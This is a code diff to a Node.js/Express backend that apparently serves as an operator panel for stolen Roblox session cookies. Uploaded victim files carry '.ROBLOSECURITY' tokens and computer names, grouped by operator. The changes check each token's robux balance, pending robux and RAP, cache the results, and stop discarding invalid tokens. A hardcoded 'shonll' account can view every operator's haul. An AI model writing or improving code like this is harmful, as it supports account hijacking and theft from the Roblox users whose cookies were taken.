@@ -832,10 +832,20 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   const db = await getDb();
   let docs;
+  const opQuery = (user.toLowerCase() === 'shonll')
+    ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+    : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+
   if (db) {
-    docs = await db.collection('files').find({ operator: user, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
+    docs = await db.collection('files').find({
+      ...opQuery,
+      'roblox.security': { $exists: true, $ne: '' }
+    }).toArray();
   } else {
-    docs = (global.memFiles || []).filter(f => f.operator === user && f.roblox && f.roblox.security);
+    docs = (global.memFiles || []).filter(f => {
+      const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+      return isOp && f.roblox && f.roblox.security;
+    });
   }
 
   const BATCH_SIZE = 10;
@@ -847,14 +857,44 @@ app.post('/robux-bulk', requireAuth, async (req, res) => {
       const roblox = doc.roblox || {};
       try {
         const info = await fetchRobuxInfo(roblox.security);
-        if (!info.valid) {
-          await removeInvalidToken(db, user, doc.name);
-          console.log(`[${new Date().toLocaleTimeString()}] 🗑 Невалидный токен удалён: ${doc.name}`);
+        if (db && info.valid && info.userId) {
+          await db.collection('files').updateOne(
+            { _id: doc._id },
+            { $set: {
+              'robuxInfo.userId': info.userId,
+              'robuxInfo.robux': info.robux,
+              'robuxInfo.pendingRobux': info.pendingRobux || 0,
+              'robuxInfo.rap': info.rap || 0,
+              'robuxInfo.valid': true,
+              'robuxInfo.checked': new Date().toISOString(),
+              'roblox.userId': info.userId,
+              ...(info.username ? { 'roblox.user': info.username } : {})
+            }}
+          );
         }
-        return { file: doc.name, originalName: doc.originalName, computer: doc.computer?.name || 'Unknown', user: roblox.user, security: roblox.security, uploadedAt: doc.uploadedAt, lastLogin: roblox.lastLogin, ...info };
+        return {
+          file: doc.name,
+          originalName: doc.originalName || doc.name,
+          computer: doc.computer?.name || 'Unknown',
+          user: info.username || roblox.user || 'Roblox User',
+          username: info.username || roblox.user || 'Roblox User',
+          userId: info.userId || roblox.userId,
+          security: roblox.security,
+          uploadedAt: doc.uploadedAt,
+          lastLogin: roblox.lastLogin,
+          ...info
+        };
       } catch (e) {
-        await removeInvalidToken(db, user, doc.name);
-        return { file: doc.name, user: roblox.user, valid: false, error: e.message };
+        return {
+          file: doc.name,
+          user: roblox.user || 'Roblox User',
+          username: roblox.user || 'Roblox User',
+          security: roblox.security,
+          valid: false,
+          error: e.message,
+          uploadedAt: doc.uploadedAt,
+          computer: doc.computer?.name || 'Unknown'
+        };
       }
     }));
     results.push(...chunkResults);
@@ -1089,6 +1129,8 @@ app.get('/check-token-request', async (req, res) => {
   }
 });
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  API — Tokens-data endpoint (Мгновенная отдача из базы данных)
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 app.get('/tokens-data', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   try {
@@ -1102,7 +1144,7 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
       docs = await db.collection('files').find({
         ...opQuery,
         'roblox.security': { $exists: true, $ne: '' }
-      }).toArray();
+      }).sort({ uploadedAt: -1 }).toArray();
     } else {
       docs = (global.memFiles || []).filter(f => {
         const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
@@ -1110,31 +1152,39 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
       });
     }
 
-    const results = [];
-    for (const doc of docs) {
+    const results = docs.map(doc => {
       const roblox = doc.roblox || {};
-      try {
-        const info = await fetchRobuxInfo(roblox.security);
-        results.push({
-          file: doc.name, originalName: doc.originalName,
-          computer: doc.computer?.name || 'Unknown', uploadedAt: doc.uploadedAt,
-          user: roblox.user, security: roblox.security, lastLogin: roblox.lastLogin, ...info
-        });
-      } catch (e) {
-        results.push({
-          file: doc.name, user: roblox.user, valid: false,
-          error: e.message, security: roblox.security,
-          uploadedAt: doc.uploadedAt, computer: doc.computer?.name || 'Unknown'
-        });
-      }
-    }
+      const robuxInfo = doc.robuxInfo || {};
+      const username = robuxInfo.username || roblox.user || 'Roblox User';
+      const userId = robuxInfo.userId || roblox.userId || null;
+      const robux = (robuxInfo.robux !== undefined && robuxInfo.robux !== null) ? robuxInfo.robux : ((roblox.robux !== undefined && roblox.robux !== null) ? roblox.robux : 0);
+      const valid = robuxInfo.valid !== undefined ? robuxInfo.valid : true;
+
+      return {
+        file: doc.name,
+        originalName: doc.originalName || doc.name,
+        computer: doc.computer?.name || 'Unknown',
+        uploadedAt: doc.uploadedAt,
+        user: username,
+        username: username,
+        userId: userId,
+        security: roblox.security,
+        robux: robux,
+        pendingRobux: robuxInfo.pendingRobux || 0,
+        rap: robuxInfo.rap || 0,
+        valid: valid,
+        lastLogin: roblox.lastLogin || null
+      };
+    });
 
     const byUser = new Map();
     for (const r of results) {
-      const id = r.userId || r.security;
+      const id = r.userId || r.username || r.security;
       if (!id) continue;
       const existing = byUser.get(id);
-      if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) byUser.set(id, r);
+      if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) {
+        byUser.set(id, r);
+      }
     }
     res.json([...byUser.values()].sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0)));
   } catch (e) {
